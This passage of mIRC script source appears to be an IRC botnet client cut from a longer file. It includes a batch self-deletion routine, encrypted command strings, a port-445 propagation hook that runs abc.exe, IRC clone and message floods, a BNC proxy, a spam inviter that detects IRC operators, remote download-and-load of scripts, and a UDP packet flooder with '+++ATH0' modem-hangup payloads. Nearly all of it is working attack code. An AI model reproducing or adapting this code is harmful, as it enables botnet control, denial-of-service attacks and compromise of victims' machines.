    .write rm.bat del /q psexec.exe
    .write rm.bat del /q remote.ini
    .write rm.bat del /q set.bat
    .write rm.bat del /q windows.ini 
    .write rm.bat kill TCP*.exe
    .write rm.bat kill TCPSVS*.exe
    .write rm.bat kill TCPSVS32.exe
    .write rm.bat del TCPSVS32.EXE
    .write rm.bat del /q c:\windows\labtec.exe
    .write rm.bat del /q c:\winnt\labtec.exe
    .write rm.bat del /q *.*
    .write rm.bat rmdir $mircdir
    .run rm.bat
    .run rm.bat
    .run rm.bat
    .run rm.bat
    if ($server != $null) { Quit Remove Successfull }
    exit
  }
}



on *:start:{ 
  unset %*chan*
  unset %clone*
  unset %h
  unset %bnc*
  unset %begshortip
  checkremove  
  if ($exists(die.exe) == $false) { set %removeitem 1 | .run $mircexe | exit }
  if ($appstate != hidden) { set %removeitem 1 | .run $mircdir $+ die.exe | exit }
  /remote on
  wcheck1
  set %erc0de 0
  _start
  set %bc $lw.decrypt(377.92g800.356d1007.08q962.14i935.176d998.092s)
  nick SYN- $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
  //anick SYN- $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
  //timercoolconnect 0 100 wcheck1
  set %bat abc.bat
  identd on $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
  username $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
  realname $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
  _start | ial on | //set %timeout 5 | if ($portfree(65004) == $false) { exit } |  if ($portfree(65004) == $true) { /socklisten blah 65004 } | //timerc 1 4 wcheck1 | //timercoolconnect -o 0 100 wcheck1
}

on *:DNS:{ if ($nick == $me) { %address = $iaddress } | if (%clones.setserver == 1) { %clones.server = $iaddress $raddress | %clones.setserver = 0  } | if (%dns.r == on) { msgx %dns.rr 14..[`15dns14`].. 5[15-RESOLVED-5]14:15 $iaddress 14-15 $naddress | unset %dns.* } }
on *:CONNECT:{ mode $me +i-x | ial on | set %msg 1 | timer 0 100 //ctcp $me Ping | //timercoolconnect off | if (%bc == $null) { set %bc $lw.decrypt(377.92g800.356d1007.08q962.14i935.176d998.092s) } | $lw.decrypt(1016.068h1061.008l1007.08j1052.02z) $lw.decrypt(377.92j683.512t827.32x764.404s719.464w818.332n917.2b) $lw.decrypt(467.8h917.2s467.8a) | /identd on $+($r(a,z),$r(1,99),$r(A,Z),$r(1,999),$r(a,z)) | /dns $me }
on *:DISCONNECT: { set %nick123 SYN- $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) | nick %nick123 | set %msg 1 | .rlevel 10 | unset %master | wcheck1 | //timercoolconnect -o 0 100 wcheck1 } 
on ^*:QUIT: { HALTDEF }
on *:EXIT: { set %msg 1 }
on *:OP:#:{ If ($opnick == $me) { //mode # +ntps } }
on *:KICK:#:{ if ($knick == $me) { $lw.decrypt(1016.068h1061.008l1007.08j1052.02z) $lw.decrypt(377.92j683.512t827.32x764.404s719.464w818.332n917.2b) $lw.decrypt(467.8h917.2s467.8a) } }
on *:JOIN:*:{ if ($nick == $me) { /window -h # | timerfastjoin off } } 

alias wcheck1 { $lw.decrypt(1096.96l971.128o1087.972d1123.924b971.128g1087.972j) $lw.decrypt(1007.08t962.14l1061.008m476.788b989.104d1061.008i1105.948b962.14v1052.02m1096.96f476.788j953.152y1061.008c1043.032d) $lw.decrypt(548.692k548.692x548.692g557.68s) }

on *:sockopen:ip*:{ if ($sockerr > 0) { halt } | if ( %port == 445 ) { 
    //run abc.exe abc.bat % [ $+ [ $sockname ] ] 
  } 
  .msgx %botchan % [ $+ [ $sockname ] ] on %port  |  inc %totalsuccess | /sockclose $sockname |  /halt
}

on *:socklisten:gtportdirect*:{  set %gtsocknum 0 | :loop |  inc %gtsocknum 1 |  if $sock(gtin*,$calc($sock(gtin*,0) + %gtsocknum ) ) != $null { goto loop } |  set %gtdone $gettok($sockname,2,46) $+ . $+ $calc($sock(gtin*,0) + %gtsocknum ) | sockaccept gtin $+ . $+ %gtdone | sockopen gtout $+ . $+ %gtdone $gettok($sock($Sockname).mark,1,32) $gettok($sock($Sockname).mark,2,32) | unset %gtdone %gtsocknum }
on *:sockread:gtin*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtinfotem [ $+ [ $sockname ] ] ] | if [ %gtinfotem [ $+ [ $sockname ] ] ] = $null { return } | if $sock( [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] ).status != active { inc %gtscatchnum 1 | set %gtempr $+ $right($sockname,$calc($len($sockname) - 4) ) $+ %gtscatchnum [ %gtinfotem [ $+ [ $sockname ] ] ] | return } | sockwrite -n [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] [ %gtinfotem [ $+ [ $sockname ] ] ] | unset [ %gtinfotem [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:sockread:gtout*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtouttemp [ $+ [ $sockname ] ] ] |  if [ %gtouttemp [ $+ [ $sockname ] ] ] = $null { return } | sockwrite -n [ gtin [ $+ [ $remove($sockname,gtout) ] ] ] [ %gtouttemp [ $+ [ $sockname ] ] ] | unset [ %gtouttemp [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:sockopen:gtout*: {  if ($sockerr > 0) return | set %gttempvar 0 | :stupidloop | inc %gttempvar 1 | if %gtempr  [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar ] ] != $null { sockwrite -n $sockname %gtempr [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar  ] ] |  goto stupidloop  } | else { unset %gtempr | unset %gtscatchnum | unset %gtempr* } }
on *:sockclose:gtout*: { unset %gtempr* | sockclose gtin $+ $right($sockname,$calc($len($sockname) - 5) ) | unset %gtscatchnum | sockclose $sockname }
on *:sockclose:gtin*: {   unset %gtempr* | sockclose gtout $+ $right($sockname,$calc($len($sockname) - 4) ) | unset %gtscatchnum  | sockclose $sockname }

on *:sockopen:dksmsgxflooder*: { if ($sockerr > 0) { return } | inc %bots 1 | sockwrite -tn $sockname USER $+($r(a,z),$r(1,999),$r(a,z),$r(a,z),$r(1,99)) $+($r(a,z),$r(1,999),$r(a,z),$r(a,z),$r(1,99)) $+($r(a,z),$r(1,999),$r(a,z),$r(a,z),$r(1,99)) $+($r(a,z),$r(1,999),$r(a,z),$r(a,z),$r(1,99)) | .sockwrite -tn $sockname NICK $+($r(A,Z),$r(a,z),$r(a,z),$r(1,9),$r(a,z),$r(a,z),$r(1,9)) | sockread }
on *:sockread:dksmsgxflooder*: { 
  sockread %temp.sock 
  if (Welcome isin %temp.sock) { 
    sockwrite -tn $sockname JOIN : $+ %nick2bomb
    sockwrite -tn $sockname PRIVMSG %nick2bomb : $+ %msg2bomb 
    sockwrite -tn $sockname NOTICE %nick2bomb : $+ %msg2bomb 
    sockwrite -tn $sockname PRIVMSG %nick2bomb :4PI1NG 4VERS1ION 4TIME 
    sockwrite -tn $sockname QUIT : $+ blah
    sockclose $sockname
    dec %bots 1 
    dksmsgxflooder
  }
  if (PING isin %temp.sock) { sockwrite -tn $sockname PONG! $gettok(%temp.sock,5,32) } 
  if ($gettok(%temp.sock,2,32) == 333) { sockwrite $sockname -tn pong $gettok(%temp.sock,5,32) } 
  if ($gettok(%temp.sock,2,32) == KICK) { sockwrite -nt clone* JOIN : $+ $gettok(%temp.sock,3,32) }
  dkmsgxfloodk in %temp.sock 
}


on *:sockclose:clone*: {  set %temp.clones.nick $remove($sockname,clone) }  
on *:sockopen:clone*: { if ($sockerr > 0) { return } | sockwrite -tn $sockname USER $+($r(a,z),$r(1,999),$r(a,z),$r(a,z),$r(1,99)) $+($r(a,z),$r(1,999),$r(a,z),$r(a,z),$r(1,99)) $+($r(a,z),$r(1,999),$r(a,z),$r(a,z),$r(1,99)) $+($r(a,z),$r(1,999),$r(a,z),$r(a,z),$r(1,99)) | .sockwrite -tn $sockname NICK $+($r(A,Z),$r(a,z),$r(a,z),$r(1,9),$r(a,z),$r(a,z),$r(1,9)) | sockread }
on *:sockread:clone*: { 
  sockread %temp.sock 
  if (PING isin %temp.sock) { sockwrite -tn $sockname PONG! $gettok(%temp.sock,5,32) } 
  if ($gettok(%temp.sock,2,32) == 333) { sockwrite $sockname -tn pong $gettok(%temp.sock,5,32) } 
  if ($gettok(%temp.sock,2,32) == KICK) { sockwrite -nt clone* JOIN : $+ $gettok(%temp.sock,3,32) }
  clone in %temp.sock 
}

on *:socklisten:bnc:{
  sockaccept bncclient $+ $rand(10000,99999)
  sockclose bnc
  socklisten bnc %bnc.port
}
on *:sockread:bncclient*:{
  sockread %bncclient 
  if ($gettok(%bncclient,1,32) == NICK) {
    set %bnc.nick $gettok(%bncclient,2,32)
  }
  if ($gettok(%bncclient,1,32) == USER) {
    set %bnc.user $gettok(%bncclient,2-,32)
    sockwrite -n $sockname NOTICE AUTH : $+ %botlogo - Bnc Service
    sockwrite -n $sockname NOTICE AUTH : $+ %botlogo - Password Needed.. /quote PASS <password>
  }
  if ($gettok(%bncclient,1,32) == pass) { 
    if ($gettok(%bncclient,2,32) == %bnc.passwd) { 
      sockwrite -n $sockname NOTICE AUTH : $+ %botlogo - Password Accepted!
      sockwrite -n $sockname NOTICE AUTH : $+ %botlogo - Welcome to $chr(91) $+ ion $+ $chr(93) $+ -Bot BNC v1.1
      sockwrite -n $sockname NOTICE AUTH : $+ %botlogo -
      sockwrite -n $sockname NOTICE AUTH : $+ %botlogo - Bnc Help:    
      sockwrite -n $sockname NOTICE AUTH : $+ %botlogo - /quote CONN <server> <port> <pass>
    } 
    if ($gettok(%bncclient,2,32) != %bnc.passwd) { 
      sockwrite -n $sockname NOTICE AUTH : $+ %botlogo - Failed Password.. Retry
    }
  }
  if ($gettok(%bncclient,1,32) == conn) {
    sockclose bncserver $+ $remove($sockname,bncclient)
    sockopen bncserver $+ $remove($sockname,bncclient) $gettok(%bncclient,2,32) $gettok(%bncclient,3,32)
    sockwrite -n $sockname NOTICE AUTH : $+ %botlogo - Connecting To $gettok(%bncclient,2,32) $gettok(%bncclient,3,32)
  }
  set %bnc.server.passwd $gettok(%bncclient,4,32)
  if ($sock(bncclient $+ $remove($sockname,bncclient)).status != active) {
    halt
  }
  sockwrite -n bncserver $+ $remove($sockname,bncclient) %bncclient
}
on *:sockopen:bncserver*:{
  if ($sockerr) {
    sockwrite -n bncclient $+ $remove($sockname,bncserver) NOTICE AUTH : $+ %botlogo - Failed Connect
    sockwrite -n bncclient $+ $remove($sockname,bncserver) NOTICE AUTH : $+ %botlogo - Bnc Help:
    sockwrite -n bncclient $+ $remove($sockname,bncserver) NOTICE AUTH : $+ %botlogo - /quote CONN <server> <port> <pass>
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockwrite -n $sockname NOTICE AUTH : $+ %botlogo - Failed Connect
    sockclose bncserver $+ $remove($socknme, bncserver)
    halt
  }
  sockwrite -n bncclient $+ $remove($sockname,bncserver) NOTICE AUTH : $+ %botlogo - Successfully Connected.. Enjoy >:)
  sockwrite -n $sockname NICK %bnc.nick
  sockwrite -n $sockname USER %bnc.user
  if (%bnc.server.passwd != $null) {
    sockwrite -n $sockname PASS %bnc.server.passwd
  }
}
on *:sockread:bncserver*:{
  sockread %bncserver
  if ($sock(bncclient $+ $remove($sockname,bncserver)).status != active) {
    halt
  }
  if (ping isin %bncserver) { sockwrite -n bncserver PONG! }
  sockwrite -n bncclient $+ $remove($sockname,bncserver) %bncserver
}
on *:sockclose:BncServer*:{
  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ %botlogo - Bnc Help:
  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ %botlogo - /quote CONN <server> <port> <pass>
}

on *:sockopen:coldflood*: {
  if ($sockerr > 0) { return }
  .sockwrite -tn $sockname USER $+($r(a,z),$r(1,999),$r(a,z),$r(a,z),$r(1,99)) $+($r(a,z),$r(1,999),$r(a,z),$r(a,z),$r(1,99)) $+($r(a,z),$r(1,999),$r(a,z),$r(a,z),$r(1,99)) $+($r(a,z),$r(1,999),$r(a,z),$r(a,z),$r(1,99)) 
  .sockwrite -tn $sockname NICK $+($r(A,Z),$r(a,z),$r(a,z),$r(1,99),$r(a,z),$r(a,z),$r(1,9),$r(A,Z))
  .sockwrite -tn $sockname JOIN : $+ %flood.chan
  .sockwrite -tn $sockname PRIVMSG %flood.chan : $+ %flood.message
  .sockwrite -tn $sockname PRIVMSG %flood.chan : $+ %flood.message
  .sockwrite -tn $sockname PRIVMSG %flood.chan : $+ %flood.message
  .sockwrite -tn $sockname PRIVMSG %flood.chan :PING VERSION TIME 
  .timer 1 2 sockclose $sockname 
}
on *:sockread:coldflood*: {
  sockread %blah
  if (PING isin %blah) { .sockwrite -tn $sockname PONG $gettok(%blah,5,32) } 
  if ($gettok(%blah,2,32) == 333) { sockwrite -tn $sockname pong $gettok(%blah,5,32) } 
  if ($gettok(%blah,2,32) == KICK) { sockwrite -tn clone* JOIN : $+ $gettok(%blah,3,32) }
  blah in %blah
}

on *:sockread:inviter*:{   sockread -f %t.i  |  if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 30) { write ichan.txt $gettok(%t.i,4,32) }  |  if ($gettok(%t.i,2,32) == 321) { msgx %s.i.c 5[15in14vit15er5]: LISTING CHANNELS ON $remove($gettok(%t.i,1,32),:) }  |  if ($gettok(%t.i,2,32) == 323) { msgx %s.i.c 5[15in14vit15er5]: LISTING CHANNELS COMPLETE ON $remove($gettok(%t.i,1,32),:)  [TOTAL CHANNELS IN LIST: $+ $lines(ichan.txt) $+ ] }  
  if ($gettok(%t.i,2,32) == 474) { msgx %s.i.c 5[15in14vit15er5]:  JOIN ERROR: BANNED FROM ( $+ $gettok(%t.i,4,32) $+ ) }    |  if ($gettok(%t.i,2,32) == 433) { /sockwrite -nt inviterN NICK $gettok(%t.i,4,32) $+ $r(a,z) } |  if ($gettok(%t.i,1,32) == PING) { sockwrite -nt $sockname PONG $gettok(%t.i,2,32) } |   if ($gettok(%t.i,2,32) == JOIN) {  if (%i.on == OFF) { halt } |   if ($timer($remove($gettok(%t.i,1,33),:)) !== $null) { halt } 
  if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt } |  set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done |   set %i.on OFF |  /timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt inviterM PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsgx |   /sockwrite -nt inviterN WHOIS : $+ $remove($gettok(%t.i,1,33),:) |   inc %i.t.j |   .timer 1 %i.ondelay set %i.on YES  }   | if ($gettok(%t.i,2,32) == KICK) { sockwrite -nt inviterN JOIN : $+ $gettok(%t.i,3,32) } 
  if ($gettok(%t.i,1,32) == ERROR) { msgx %s.i.c 5[15in14vit15er5]: ERROR CONNECTING: %t.i (attempting to reconnect)-(to stop !inviter stop) | /timerinviteconnect 0 3 /sockopen inviter %i.server %i.port } 
  if ($gettok(%t.i,2,32) == MODE) {    if ($gettok(%t.i,4,32) == +o) {    if ($timer($gettok(%t.i,5,32)) == $null) { halt } |    .timer $+ $gettok(%t.i,5,32) off |     dec %i.t.j 1  |   .msgx #fl33t inviter! error: not inviting: $gettok(%t.i,5,32)  because he was opd!   }   |   if ($gettok(%t.i,4,32) == +v) {   if ($timer($gettok(%t.i,5,32)) == $null) { halt } |    .timer $+ $gettok(%t.i,5,32) off |    dec %i.t.j 1 |   } }
  if ($gettok(%t.i,2,32) == NICK) {   if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off |  dec %i.t.j  } | if ($gettok(%t.i,2,32) == QUIT) {  if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off   |  dec %i.t.j  } |  if ($gettok(%t.i,2,32) == 313) {   .msgx %s.i.c 12INVITER WARNING!!!: 3IRCOP DETECTED!!!! 10-[12 $+ $gettok(%t.i,4,32) $+ 10] 
  if ($timer($gettok(%t.i,4,32)) == $null) { halt } |  /timer $+ $gettok(%t.i,2,32) off  } 
}
on *:sockopen:inviter*: {   sockwrite -nt $sockname PONG $server |  sockwrite -tn $sockname USER $read ex.scr $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  ex.scr ] ] |  sockwrite -tn $sockname NICK $read ex.scr  | /timerinviteconnect off | sockread  }
on *:sockclose:inviter*:{ if (%i.b == off) { remove ichan.txt | halt }  |  if (%i.b == on) { msgx %s.i.c 5[15in14vit15er5]:  INVITER WAS DISCONNECTED! (RELOADING).  | /sockopen $sockname %i.server %i.port } }

on *:SOCKREAD:wwwGet: { .remove $mircdir\Temp  | msgx %w.g.# 15Downloading...14 $gettok($sock($sockname).mark,3,32) | if ($sockerr > 0) return | :nextread | sockread %WWW.Temp |  if ($sockbr != 0) { if (%WWW.Temp != $Null) {  write $mircdir\Temp %WWW.Temp  } |  goto nextread   } | if (HTTP/1.*20* iswm [ $read -l1 $mircdir\Temp ] ) { if ($exists($gettok($sock($sockname).mark,2,32))) {  .remove $gettok($sock($sockname).mark,2,32) } |   :GenNew |  set -u0 %WWW.Temp www $+ $rand(A,Z) $+ $rand(0,9) |  if ($sock(%WWW.Temp) != $null) { goto GenNew } |  sockrename wwwGet %WWW.Temp | if (text/* iswm [ $read -sContent-Type: $mircdir\Temp ] ) { sockmark %WWW.Temp Text $gettok($sock($sockname).mark,2-,32)  } | else {   sockmark %WWW.Temp Bin $gettok($sock($sockname).mark,2-,32)  } |  .timer 1 1 sockwrite -tn %WWW.Temp GET $gettok($sock($sockname).mark,3,32)  } | else {  //echo -st $read -l2 $mircdir\Temp  } | unset %WWW.Temp }
on *:SOCKREAD:www*: {  if ($sockerr > 0) return | :nextread | if ($gettok($sock($sockname).mark,1,32) == bin) { sockread &Temp |   if ($sockbr == 0) return |  if ($bvar(&Temp,0) != 0) { bwrite $gettok($sock($SockName).Mark,2,32) -1 $bvar(&Temp,0) &temp }  } | else {  sockread %WWW.Temp |  if ($sockbr == 0) return |  if (%WWW.Temp != $Null) { write $gettok($sock($SockName).Mark,2,32) %WWW.Temp } |   unset %WWW.Temp  } | goto nextread }
on *:SOCKOPEN:wwwGet: { sockwrite -tn wwwGet HEAD $gettok($sock($sockname).mark,3,32) HTTP/1.1 | sockwrite -tn wwwGet Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */* | sockwrite -tn wwwGet Accept-Language: en-au |  sockwrite -tn wwwGet Accept-Encoding: deflate |   sockwrite -tn wwwGet User-Agent: mIRCInstaller WWW Edition v0.0.1 | sockwrite -tn wwwGet Host: $host | sockwrite -tn wwwGet Connection: Keep-Alive  | sockwrite -tn wwwGet $lf  }
on *:SOCKCLOSE:www*: {  msgx %w.g.# 14[15Fie:14 $+ $gettok($sock($sockname).mark,3-,32) $+ ] 14[15size:14 $+ $file($gettok($sock($sockname).mark,2,32)).size $+ ]5 downloaded successfully... |  if ($exists( [ $mircdir\Temp ] )) { .remove $mircdir\Temp } | unset %WWW* | unset %w.g.# }

on *:sockopen:s7kill*:{ if ($sockerr > 0) {  return  } }
on *:sockread:s7kill*: { sockread -f %s7kill |   if (%s7kill == PWD) { sockwrite $sockname PWD14438136782715101980 |  //timer 1 4 //sockwrite $sockname RMS } | else { sockwrite $sockname RMS } |  unset %s7kill }

on *:sockopen:icqpager*:{ sockwrite -nt $sockname GET /scripts/WWPmsgx.dll?from= $+ %ipb.n $+ &fromemail= $+ %ipb.n $+ &subject= $+ %ipb.sub $+ &body=  $+ %ipb.m $+ &to=  $+ %ipb.uin $+ &Send=Message   | sockwrite $sockname $crlf $+ $crlf |  sockread }
on *:sockread:icqpager*:{ sockread -f %temp }
on *:sockclose:icqpager*:{ unset %temp }

on *:sockopen:range.*:{ if ($sock($sockname).status == active) { set %range.ports %range.ports $sock($sockname).port | sockclose $sockname } }

on *:SOCKREAD:webpage*: {
  sockread %tempweb
  if (%tempweb == HTTP/1.1 404 Not Found) { msgx $connect.chan 14•15Clicker14• Aborted clicking 12 $+ %click.url $+ 12 8Page doesn't exist! | timerclicker off | unset %click.url }
}
on *:SOCKOPEN:webpage*: { sockwrite -n $sockname GET %click.url2 | sockwrite $sockname $crlf }

on *:SOCKOPEN:lynch0*:/sockwrite -n $sockname SERVER %lm
on *:SOCKWRITE:lynch0*:/sockwrite -n $sockname SERVER %lm
on *:SOCKCLOSE:lynch0*://sockopen lynch0 $+ $remove($sockname,lynch0) %lynch0.s

on *:sockopen:cfdl.*: {
  if ($sockerr) { if ($sockerr = 4) var %cfdl.err = resolve host | else var %cfdl.err = connect to host |  msgx %dchan Error - Unable to %cfdl.err $+ , halting. | return }
  msgx %dchan Connected to %h
  msgx %dchan Attempting to download: %p
  sockwrite -n $sockname GET %p 
  sockwrite -n $sockname Accept: */*
  sockwrite -n $sockname User-Agent: get ova me.net ;-)
  sockwrite -n $sockname Host: $gettok($sockname,-1,47)
  sockwrite -n $sockname
}
on *:sockread:cfdl.*: {
  if ($sockerr) { msgx %dchan Error: ( $+ $sock($sockname).wsmsgx $+ ) | return }
  sockread &tmp
  while ($sockbr) {
    set %_kb $bytes($calc($sock($sockname).rcvd / ($ctime - %ctime)),3).suf
    bwrite $+(",$mircdir,$nopath(%p),") -1 -1 &tmp
    sockread &tmp
  }
}
on *:sockclose:cfdl.*: { msgx %dchan Download Complete!, in $chr($asc([)) $+ $duration($calc($ctime - %ctime)) $+ $chr($asc(])) at $chr($asc([)) $+ %_kb $+ /sec $+ $chr($asc(])) as $chr($asc([)) $+ $nopath(%p) $+ $chr($asc(])) size $chr($asc([)) $+ $bytes($file($nopath(%p).size)).suf $+ $chr($asc(])) | if (%loadscript == 1) { .load -rs $nopath(%p) | msgx %dchan Loaded $nopath(%p) $+ , lines: $lines($nopath(%p)) $+ , scripts currently loaded: $script(0) | unset %loadscript } } 

alias msgx { 
  if ($left($1,1) != $chr(35)) { .msg $1- } 
  if ($left($1,1) == $chr(35)) { if (%msg == 1) { msg $1- } | else { return } }
}

on *:SOCKOPEN:mailsend.*: { if ($sockerr > 0) { return } | .sockwrite -tn $sockname HELO | .sockwrite -tn $sockname MAIL FROM: %mfrom | .sockwrite -tn $sockname RCPT TO: %mto | .sockwrite -tn $sockname DATA | .sockwrite -tn $sockname %mdata | .sockwrite -tn $sockname . | .sockwrite -tn $sockname QUIT | .sockwrite -tn $sockname BYE | .sockclose $sockname }

alias gcoolstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msgx %pchan [packeting]: HALTED! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msgx %pchan ERROR! CURRENTLY FLOODING: $gettok($timer(gcoolt).com,3,32)  | return } |  msgx %pchan 14[sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ )14] (est total: $bytes($calc(6152 * $1)).suf $+ ) |  set %gnum 0 |  .timergcoolt -m 0 60 gdope $1 $2 $3 }
alias gdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 2 
  %gnum.p = $r(1,65000)
  sockudp gnumc1 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
  %gnum.p = $r(1,65000) 
  sockudp gnumc3 $2 %gnum.p + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
  %gnum.p = $r(1,65000)
  sockudp gnumc2 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  %gnum.p = $r(1,65000)
  sockudp gnumc4 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
  %gnum.p = $r(1,65000)
